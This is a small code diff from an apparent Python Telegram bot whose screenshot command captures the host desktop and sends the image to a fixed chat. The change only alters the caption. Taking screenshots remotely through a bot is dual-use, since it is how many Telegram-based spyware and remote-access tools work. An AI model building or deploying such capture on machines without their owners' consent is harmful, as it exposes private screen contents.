@@ -40,7 +40,7 @@ async def screenshot_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
             img = ImageGrab.grab()
             temp_screenshot_path = f"{sys.platform}_{datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}_screenshot.png"
             img.save(temp_screenshot_path)
-            await context.bot.send_photo(chat_id=CHAT_ID, photo=open(temp_screenshot_path, 'rb'), caption='Desktop Screenshot')
+            await context.bot.send_photo(chat_id=CHAT_ID, photo=open(temp_screenshot_path, 'rb'), caption=temp_screenshot_path)
             logger.info(f"Sent successfully to {USER_ID}")
         except Exception as e:
             logger.error(f"Cant take screenshot: {e}")
